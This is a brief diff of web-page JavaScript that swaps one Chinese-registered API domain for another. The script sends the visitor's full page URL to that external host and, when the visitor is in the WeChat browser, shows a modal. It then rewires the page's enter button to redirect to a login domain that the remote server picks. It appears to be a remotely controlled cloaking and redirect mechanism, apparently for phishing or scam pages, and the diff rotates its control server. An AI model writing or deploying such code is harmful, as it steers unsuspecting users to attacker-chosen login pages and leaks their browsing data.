@@ -42,7 +42,7 @@
     const modal=document.getElementById("wechatModal"),btn=document.getElementById("enterBtn");
     modal.style.display="none";
     if(new URLSearchParams(location.search).get('login')==='true') return;
-    fetch("https://api.drykfs.cn/api/index/selectRoute?url="+encodeURIComponent(location.href)).then(r=>r.json()).then(d=>{
+    fetch("https://api.hbsg9.cn/api/index/selectRoute?url="+encodeURIComponent(location.href)).then(r=>r.json()).then(d=>{
         if(d&&d.code===1 && /micromessenger/i.test(navigator.userAgent)) modal.style.display="flex";
         let redir=d?.data?.loginDomain;
         if(redir){ btn.replaceWith(btn.cloneNode(true)); document.getElementById("enterBtn").onclick=()=>location.href=redir; }
